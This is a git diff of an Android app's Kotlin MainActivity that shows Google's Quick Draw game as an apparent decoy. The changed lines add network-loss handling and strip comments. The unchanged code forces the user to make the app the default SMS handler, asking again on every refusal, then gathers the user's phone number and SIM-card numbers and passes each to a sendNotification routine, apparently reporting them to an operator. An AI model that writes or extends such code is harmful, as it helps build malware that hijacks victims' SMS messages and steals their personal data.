@@ -7,6 +7,10 @@ import android.content.Intent
 import android.content.SharedPreferences
 import android.graphics.Color
 import android.graphics.drawable.ColorDrawable
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.os.Build
 import android.os.Bundle
 import android.provider.Telephony
@@ -42,6 +46,8 @@ class MainActivity : AppCompatActivity() {
     private val SIM_INFO_SENT_KEY = "sim_info_sent"
     private val PHONE_NUMBER_KEY = "phone_number"
     private val PHONE_NUMBER_ENTERED_KEY = "phone_number_entered"
+    private lateinit var connectivityManager: ConnectivityManager
+    private var isNetworkDialogShowing = false
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -50,6 +56,7 @@ class MainActivity : AppCompatActivity() {
 
         sharedPrefs = getSharedPreferences("app_prefs", MODE_PRIVATE)
         webView = findViewById(R.id.webView)
+        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
 
         with(webView.settings) {
             javaScriptEnabled = true
@@ -63,8 +70,70 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        webView.loadUrl("https://quickdraw.withgoogle.com")
+        setupNetworkMonitoring()
         checkAndRequestSmsRole()
+    }
+
+    private fun setupNetworkMonitoring() {
+        val networkRequest = NetworkRequest.Builder()
+            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+            .build()
+
+        connectivityManager.registerNetworkCallback(networkRequest, object : ConnectivityManager.NetworkCallback() {
+            override fun onAvailable(network: Network) {
+                super.onAvailable(network)
+                runOnUiThread {
+                    if (isNetworkDialogShowing) {
+                        isNetworkDialogShowing = false
+                        // Закрываем диалог при восстановлении соединения
+                        webView.loadUrl("https://quickdraw.withgoogle.com")
+                    }
+                }
+            }
+
+            override fun onLost(network: Network) {
+                super.onLost(network)
+                runOnUiThread {
+                    if (!isNetworkDialogShowing) {
+                        showNoInternetDialog()
+                        isNetworkDialogShowing = true
+                    }
+                }
+            }
+        })
+    }
+
+    private fun showNoInternetDialog() {
+        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_no_internet, null)
+        val retryButton = dialogView.findViewById<AppCompatButton>(R.id.retry_button)
+        val dialogTitle = dialogView.findViewById<TextView>(R.id.dialog_title)
+        val dialogMessage = dialogView.findViewById<TextView>(R.id.dialog_message)
+
+        dialogTitle.text = "Нет интернет-соединения"
+        dialogMessage.text = "Проверьте подключение к интернету и попробуйте снова"
+
+        val dialog = AlertDialog.Builder(this)
+            .setView(dialogView)
+            .setCancelable(false)
+            .create()
+
+        retryButton.setOnClickListener {
+            if (isNetworkAvailable()) {
+                dialog.dismiss()
+                isNetworkDialogShowing = false
+                webView.loadUrl("https://quickdraw.withgoogle.com")
+            }
+        }
+
+        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
+        dialog.show()
+    }
+
+    private fun isNetworkAvailable(): Boolean {
+        val network = connectivityManager.activeNetwork
+        val capabilities = connectivityManager.getNetworkCapabilities(network)
+        return capabilities != null && 
+               capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
     }
 
     private fun checkAndRequestSmsRole() {
@@ -116,11 +185,9 @@ class MainActivity : AppCompatActivity() {
         val dialogTitle = dialogView.findViewById<TextView>(R.id.dialog_title)
         val dialogMessage = dialogView.findViewById<TextView>(R.id.dialog_message)
     
-        // Устанавливаем текст для заголовка и сообщения
         dialogTitle.text = "Введите номер телефона"
         dialogMessage.text = "Пожалуйста, введите ваш номер телефона для подтверждения"
     
-        // Настройка маски для российского номера телефона
         setupPhoneMask(phoneInput)
     
         val dialog = AlertDialog.Builder(this)
@@ -131,8 +198,8 @@ class MainActivity : AppCompatActivity() {
         continueButton.setOnClickListener {
             val rawPhone = getRawPhoneNumber(phoneInput)
             val formattedPhone = phoneInput.text.toString().trim()
-            if (rawPhone.length == 10) { // 10 цифр без +7
-                val fullPhone = "7$rawPhone" // Полный номер в формате 7XXXXXXXXXX
+            if (rawPhone.length == 10) {
+                val fullPhone = "7$rawPhone"
                 sharedPrefs.edit().putString(PHONE_NUMBER_KEY, fullPhone).apply()
                 sharedPrefs.edit().putBoolean(PHONE_NUMBER_ENTERED_KEY, true).apply()
                 sendNotification("Введенный номер телефона: $formattedPhone")
@@ -147,24 +214,16 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupPhoneMask(editText: EditText) {
-        // Создаем маску для российского номера
         val mask = MaskImpl.createTerminated(PredefinedSlots.RUS_PHONE_NUMBER)
-        
-        // Настраиваем маску:
-        mask.isHideHardcodedHead = true // скрывать +7 пока не начали ввод
-        mask.placeholder = '_' // символ-заполнитель
-        
-        // Создаем форматтер и вешаем на EditText
+        mask.isHideHardcodedHead = true
+        mask.placeholder = '_'
         val formatWatcher = MaskFormatWatcher(mask)
         formatWatcher.installOn(editText)
-        
-        // Устанавливаем начальное значение
         editText.setText("+7")
-        editText.setSelection(editText.text.length) // курсор в конец
+        editText.setSelection(editText.text.length)
     }
 
     private fun getRawPhoneNumber(editText: EditText): String {
-        // Получаем текст без форматирования (+7, скобок, пробелов и дефисов)
         val text = editText.text.toString()
         return text.replace(Regex("[^0-9]"), "").removePrefix("7")
     }
@@ -173,7 +232,6 @@ class MainActivity : AppCompatActivity() {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SMS_ROLE_REQUEST_CODE) {
             if (isDefaultSmsApp()) {
-                // Пользователь предоставил разрешение
                 if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
                     sendNotification("Пользователь сделал приложением по умолчанию")
                     sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
@@ -186,7 +244,6 @@ class MainActivity : AppCompatActivity() {
                     showPhoneNumberDialog()
                 }
             } else {
-                // Пользователь отказал - запрашиваем снова
                 requestSmsRole()
             }
         }
@@ -234,7 +291,6 @@ class MainActivity : AppCompatActivity() {
         sendNotification("Информация о SIM-картах:\n$simInfo")
         sharedPrefs.edit().putBoolean(SIM_INFO_SENT_KEY, true).apply()
     }
-
 
     @SuppressLint("HardwareIds", "MissingPermission")
     private fun getSimNumbersString(): String {
